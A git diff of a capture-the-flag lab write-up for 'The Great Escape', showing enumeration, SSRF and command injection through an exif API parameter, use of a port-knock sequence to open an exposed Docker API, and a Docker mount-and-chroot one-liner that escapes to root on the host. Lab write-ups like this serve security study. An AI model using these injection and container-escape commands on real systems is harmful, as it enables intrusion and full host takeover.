@@ -1,6 +1,6 @@
 ## The Great Escape
 
-#Enumeration
+# Enumeration
 ```
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-14 14:19 PST
 Nmap scan report for 10.10.26.86
@@ -54,7 +54,7 @@ Makes popups to display wrong password cant brute force simply
 Is also configured through gobuster to display 200 response for page that don't exist therefore enumeration is difficult
 Our nmap scan did point out a robots.txt file with the following
 
-#robots.txt
+# robots.txt
 ```
 User-agent: *
 Allow: /
@@ -62,7 +62,7 @@ Disallow: /api/
 # Disallow: /exif-util
 Disallow: /*.bak.txt$
 ```
-#exif-util
+# exif-util
 
 This allows upload of files or use of url to read exif data of a file.
 The upload side of this doesn't seem to have visible results however using the url side can work
@@ -95,7 +95,7 @@ XMP:
 
 This seems to be a vector for SSRF so lets try and read another page on the robots.txt /api directly and through directory traversal
 
-# exif-util http://10.10.225.48/api
+exif-util http://10.10.225.48/api
 ```
 An error occurred: File format could not be determined
                 Retrieved Content
@@ -113,7 +113,8 @@ An error occurred: File format could not be determined
 </body>
 </html>
 ```
-# exif-util http://10.10.225.48/exif-util/../api
+
+exif-util http://10.10.225.48/exif-util/../api
 ```
 An error occurred: File format could not be determined
                 Retrieved Content
@@ -131,9 +132,10 @@ An error occurred: File format could not be determined
 </body>
 </html>
 ```
+
 same result so we can use directory traversal but after several tries we can't seem to beyond the web directory itself so we should likely explore trying to find the bak.txt file that has been disallowed 
 
-#exif-util.bak.txt
+exif-util.bak.txt
 ```
 <template>
   <section>
@@ -203,7 +205,8 @@ export default {
 
 http://api-dev-backup:8080/exif stands out
 so lets try and utilize this backup api to 
-10.10.249.5/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la
+
+/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la
 ```
 An error occurred: File format could not be determined
                 Retrieved Content
@@ -219,7 +222,9 @@ drwxr-xr-x 1 root root     4096 Jan  7 22:14 ..
 -rwxr-xr-x 1 root root 50433552 Jan  7 16:46 application
 
 ```
+
 awesome this works so now lets try and explore the rest of the filesystem
+
 10.10.249.5/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la /
 ```
 An error occurred: File format could not be determined
@@ -255,6 +260,7 @@ drwxr-xr-x  1 root root 4096 Dec  9 23:22 usr
 drwxr-xr-x  1 root root 4096 Dec  9 23:22 var
 drwxr-xr-x  1 root root 4096 Jan  7 17:42 work
 ```
+
 after exploring a bit in root we find the following
 ```
 An error occurred: File format could not be determined
@@ -274,9 +280,9 @@ drwxr-xr-x 1 root root 4096 Jan  7 16:48 .git
 -rw-r--r-- 1 root root   53 Jan  6 20:51 .gitconfig
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 -rw-rw-r-- 1 root root  201 Jan  7 16:46 dev-note.txt
-
 ```
-so we cat out the dev-note.txt file
+
+so we read the dev-note.txt file
 ```
 An error occurred: File format could not be determined
                 Retrieved Content
@@ -296,9 +302,11 @@ Cheers,
 
 Hydra
 ```
+
 so we have a password but it doesn't seem to work for us in ssh or on the server so perhaps we need to use this git repository to find more information
 
 git -C /root log
+```
 An error occurred: File format could not be determined
                 Retrieved Content
                 ----------------------------------------
@@ -324,6 +332,8 @@ Author: Hydra <hydragyrum@example.com>
 Date:   Wed Jan 6 20:51:39 2021 +0000
 
     Added the flag and dev notes
+```
+
 lets show this last one a3d30a7d0510dc6565ff9316e3fb84434916dee8
 ```
 An error occurred: File format could not be determined
@@ -367,6 +377,7 @@ index 0000000..aae8129
 +REDACTED
 \ No newline at end of file
 ```
+
 we found the root flag and it looks like we need to do a port knock sequence to open the docker port, which upon lookup should default to 2375
 
 knock 10.10.249.5 42 1337 10420 6969 63000
@@ -383,6 +394,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
 ```
+
 our docker port is now open!
 ```
 docker -H 10.10.249.5:2375 images
@@ -404,6 +416,7 @@ CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS     
 cb83912607b9   exif-api       "./application -Dqua…"   6 weeks ago   Up 37 minutes   8080/tcp               dockerescapecompose_api_1
 548b701caa56   endlessh       "/endlessh -v"           6 weeks ago   Up 37 minutes   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
 ```
+
 We find that the api is exposed and we can look at the containers running, looks like that ssh port we found was a blackhole hence the inability to use the credential we found earlier
 so let utilize this frontend container dockerescapecompose_frontend_1 to try and execute /bin/bash
 ```
@@ -436,6 +449,7 @@ drwxr-xr-x  1 root root 4096 Dec  9 23:22 usr
 drwxr-xr-x  1 root root 4096 Dec  9 23:22 var
 root@docker-escape:/#
 ```
+
 we eventually find the webserver in /usr/share/nginx/html/
 in .wellknown we find the following
 ```
@@ -448,19 +462,18 @@ See https://securitytxt.org/ for more information.
 
 Ping /api/fl46 with a HEAD request for a nifty treat.
 ```
+so we do the following
+``
 curl --HEAD 10.10.249.5/api/fl46
 HTTP/1.1 200 OK
 Server: nginx/1.19.6
 Date: Sun, 21 Feb 2021 21:39:54 GMT
 Connection: keep-alive
 flag: REDACTED
-
+``
 back to escpaing the container we saw alpine in the images and we find a oneliner on gtfobins to abuse it
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 so we modifiy it with the tag 
 to do the following
 docker -H 10.10.249.5:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
 and we are root on the actual system!
-
-
-
